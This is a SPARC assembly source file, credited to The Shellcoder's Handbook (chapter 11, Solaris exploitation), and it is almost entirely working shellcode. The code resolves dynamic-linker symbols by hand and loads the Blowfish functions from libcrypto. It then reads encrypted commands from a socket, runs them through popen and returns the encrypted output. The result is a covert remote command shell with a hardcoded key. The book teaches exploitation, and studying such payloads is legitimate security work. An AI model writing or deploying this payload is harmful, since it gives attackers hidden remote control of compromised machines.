/*

The Shellcoder's Handbook: Discovering and Exploiting Security Holes
Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
Sinan Eren, Neel Mehta, Riley Hassell
Publisher: John Wiley & Sons
ISBN: 0764544683

Chapter 11: Advanced Solaris Exploitation
Sample Program #4

Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 

*/

.section      ".text"
      .align 4
      .global main
      .type      main,#function
      .proc      04
main:
      call      next
      nop
!use %i1 for SOCK
next:
      add      %o7, 0x368, %i2      !functable addr
      
      add      %i2, 40, %o0      !LDSO string
      mov      0, %o1
      mov      5, %g1            !SYS_open
      ta      8

      mov      %o0, %i4            !fd
      mov      %o0, %o4              !fd
      mov      0, %o0            !NULL      
      sethi      %hi(16384000), %o1      !size
      mov      1, %o2                  !PROT_READ
      mov      2, %o3                  !MAP_PRIVATE
      sethi        %hi(0x80000000), %g1
      or        %g1, %o3, %o3
      mov      0, %o5                  !offset
      mov      115, %g1                  !SYS_mmap
      ta      8
      
      mov      %i2, %l5            !need to store functable to temp reg
      mov     %o0, %i5            !addr from mmap()
      add      %i2, 64, %o1      !"_dlsym" string      
      call      find_sym
      nop
      mov      %l5, %i2            !restore functable

      mov      %o0, %i3            !location of _dlsym in ld.so.1

      mov      %i5, %o0                  !addr
      sethi      %hi(16384000), %o1      !size
      mov      117, %g1                  !SYS_munmap
      ta      8

      mov      %i4, %o0                  !fd
      mov      6, %g1                  !SYS_close
      ta      8

      sethi      %hi(0xff3b0000), %o0    !0xff3b0000 is ld.so base in every process
      add      %i3, %o0, %i3            !address of _dlsym()
      st      %i3, [ %i2 + 0 ]            !store _dlsym() in functable

      mov      -2, %o0
      add      %i2, 72, %o1            !"_dlopen" string
      call      %i3
      nop
      st      %o0, [%i2 + 4]            !store _dlopen() in functable

      mov      -2, %o0
      add      %i2, 80, %o1            !"_popen" string
      call      %i3
      nop
      st      %o0, [%i2 + 8]            !store _popen() in functable

      mov      -2, %o0
      add      %i2, 88, %o1            !"fread" string
      call      %i3
      nop
      st      %o0, [%i2 + 12]            !store fread() in functable

      mov      -2, %o0
      add      %i2, 96, %o1            !"fclose" string
      call      %i3
      nop
      st      %o0, [%i2 + 16]            !store fclose() in functable
      
      mov      -2, %o0
      add      %i2, 104, %o1            !"strlen" string
      call      %i3
      nop
      st      %o0, [%i2 + 20]            !store strlen() in functable

      mov      -2, %o0
      add      %i2, 112, %o1            !"memset" string
      call      %i3
      nop
      st      %o0, [%i2 + 24]            !store memset() in functable


      ld      [%i2 + 4], %o2            !_dlopen()
      add      %i2, 120, %o0            !"/usr/local/ssl/lib/libcrypto.so" string
      mov      257, %o1                  !RTLD_GLOBAL | RTLD_LAZY
      call      %o2
      nop

      mov      -2, %o0
      add      %i2, 152, %o1            !"BF_set_key" string
      call      %i3
      nop
      st      %o0, [%i2 + 28]            !store BF_set_key() in func-table

      mov      -2, %o0
      add      %i2, 168, %o1            !"BF_cfb64_encrypt" string
      call      %i3                        !call _dlsym()
      nop
      st      %o0, [%i2 + 32]            !store BF_cfb64_encrypt() in functable

      !BF_set_key(&BF_KEY, 64, &KEY);
      !this API overwrites %g2 and %g3
      !take care!
        add     %i2, 0xc8, %o2          ! KEY
      mov      64, %o1                  ! 64
      add      %i2, 0x110, %o0            ! BF_KEY
        ld      [%i2 + 28], %o3         ! BF_set_key() pointer
        call    %o3
        nop      

while_loop:

      mov      %i1, %o0            !SOCKET
      sethi      %hi(8192), %o2
      
      !reserve some space
      sethi      %hi(0x2000), %l1
      add      %i2, %l1, %i4            ! somewhere after BF_KEY

      mov      %i4, %o1                  ! read buffer in %i4
      mov      3, %g1                  ! SYS_read
      ta      8

      cmp      %o0, -1                  !len returned from read()
      bne      proxy
      nop
      b      error_out                  !-1 returned exit process
       nop

proxy:
      !BF_cfb64_encrypt(in, out, strlen(in), &key, ivec, &num, enc); DE-CRYPT
      mov      %o0, %o2            ! length of in
      mov      %i4, %o0            ! in
      sethi   %hi(0x2060), %l1
      add      %i4, %l1, %i5            !duplicate of out
      add     %i4, %l1, %o1            ! out      
        add     %i2, 0x110, %o3         ! key
      sub      %o1, 0x40, %o4            ! ivec
      st      %g0, [%o4]                  ! ivec = 0
      sub      %o1, 0x8, %o5            ! &num
      st      %g0, [%o5]                  ! num = 0
      !hmm stack stuff..... put enc [%sp + XX]
      st     %g0, [%sp+92]            !BF_DECRYPT    0
        ld      [%i2 + 32], %l1       ! BF_cfb64_encrypt() pointer
        call    %l1
        nop      

      mov      %i5, %o0                  ! read buffer
      add      %i2, 192, %o1            ! "rw" string
      ld      [%i2 + 8], %o2            ! _popen() pointer
      call      %o2
      nop

      mov      %o0, %i3            ! store FILE *fp

      mov      %i4, %o0            ! buf
      sethi      %hi(8192), %o1            ! 8192
      mov      1, %o2                  ! 1
      mov      %i3, %o3                  ! fp
      ld      [%i2 + 12], %o4            ! fread() pointer 
      call      %o4
      nop
      
      mov      %i4, %o0                  !buf
      ld      [%i2 + 20], %o1            !strlen() pointer
      call      %o1, 0
      nop

      !BF_cfb64_encrypt(in, out, strlen(in), &key, ivec, &num, enc); EN-CRYPT
      mov      %o0, %o2                  ! length of in
      mov      %i4, %o0                  ! in
           mov      %o2, %i0                  ! store length for write(.., len) 
        mov     %i5, %o1                 ! out
        add     %i2, 0x110, %o3       ! key
        sub     %i5, 0x40, %o4        ! ivec
        st      %g0, [%o4]            ! ivec = 0
        sub     %i5, 0x8, %o5         ! &num
        st      %g0, [%o5]            ! num = 0
      !hmm stack shit..... put enc [%sp + 92]
      mov      1, %l1
      st      %l1, [%sp+92]            !BF_ENCRYPT      1
        ld      [%i2 + 32], %l1       ! BF_cfb64_encrypt() pointer
        call    %l1
        nop      

      mov      %i0, %o2            !len to write()
      mov      %i1, %o0            !SOCKET
      mov      %i5, %o1            !buf
      mov      4, %g1            !SYS_write
      ta      8

      mov      %i4, %o0                  !buf
      mov      0, %o1                  !0x00
      sethi      %hi(8192), %o2
      or      %o2, 8, %o2                  !8192
      ld      [%i2 + 24], %o3            !memset() pointer
      call      %o3, 0
      nop

      mov      %i3, %o0
      ld      [%i2 + 16], %o1       !fclose() pointer
      call      %o1, 0
      nop

      b      while_loop
      nop

error_out:
      mov      0, %o0
      mov      1, %g1            !SYS_exit
      ta       8

! following assembly code is extracted from the -fPIC (position inde-pendent) 
! compiled version of the C code presented in this section.
! refer to find_sym.c for explanation of the following assembly routine.
find_sym:
      ld      [%o0 + 32], %g3
      clr     %o2
      lduh    [%o0 + 48], %g2
      add     %o0, %g3, %g3
      ba      f1
      cmp     %o2, %g2
f3:
      add     %o2, 1, %o2
      cmp     %o2, %g2
      add     %g3, 40, %g3
f1:
      bge     f2
      sll     %o5, 2, %g2
      ld      [%g3 + 4], %g2
      cmp     %g2, 11
      bne,a        f3
      lduh    [%o0 + 48], %g2
      ld      [%g3 + 24], %o5
      ld      [%g3 + 12], %o3
      sll     %o5, 2, %g2
f2:
      ld      [%o0 + 32], %g3
      add     %g2, %o5, %g2
      sll     %g2, 3, %g2
      add     %o0, %g3, %g3
      add     %g3, %g2, %g3
      ld      [%g3 + 12], %o5
      and     %o0, -4, %g2
      add     %o3, %g2, %o4
      add     %o5, %g2, %o5
f5:
      add     %o4, 16, %o4
f4:
      ldub    [%o4 + 12], %g2
      and     %g2, 15, %g2
      cmp     %g2, 2
      bne,a        f4
      add     %o4, 16, %o4
      ld      [%o4], %g2
      mov     %o1, %o2
      ldsb    [%o2], %g3
      add     %o5, %g2, %o3
      ldsb    [%o5 + %g2], %o0
      cmp     %o0, %g3
      bne     f5
      add     %o2, 1, %o2
      ldsb    [%o3], %g2
f7:
      cmp     %g2, 0
      be      f6
      add     %o3, 1, %o3
      ldsb    [%o2], %g3
      ldsb    [%o3], %g2
      cmp     %g2, %g3
      be      f7
      add     %o2, 1, %o2
      ba      f4
      add     %o4, 16, %o4
f6:
      jmp     %o7 + 8
      ld      [%o4 + 4], %o0
functable:
        .word 0xbabebab0        !_dlsym
        .word 0xbabebab1        !_dlopen
        .word 0xbabebab2        !_popen
        .word 0xbabebab3        !fread
        .word 0xbabebab4        !fclose
        .word 0xbabebab5        !strlen
        .word 0xbabebab6        !memset
        .word 0xbabebab7        !BF_set_key
        .word 0xbabebab8        !BF_cfb64_encrypt
        .word 0xffffffff

LDSO:
        .asciz  "/usr/lib/ld.so.1"
        .align 8
DLSYM:
        .asciz  "_dlsym"
        .align 8
DLOPEN:
        .asciz  "_dlopen"
        .align 8
POPEN:
        .asciz  "_popen"
        .align 8
FREAD:
        .asciz  "fread"
        .align 8
FCLOSE:
        .asciz  "fclose"
        .align 8
STRLEN:
        .asciz  "strlen"
        .align 8
MEMSET:
        .asciz  "memset"
        .align 8
LIBCRYPTO:
        .asciz  "/usr/local/ssl/lib/libcrypto.so"
        .align 8
BFSETKEY:
        .asciz  "BF_set_key"
        .align 8
BFENCRYPT:
        .asciz  "BF_cfb64_encrypt"
        .align 8
RW:
      .asciz      "rw"
      .align 8
KEY:      
      .asciz
      "6fa1d67f32d67d25a31ee78e487507224ddcc968743a9cb81c912a78ae0a0ea9"
      .align 8
BF_KEY:
        .asciz  "12341234" !BF_KEY storage, actually its way larger 
      .align 8  
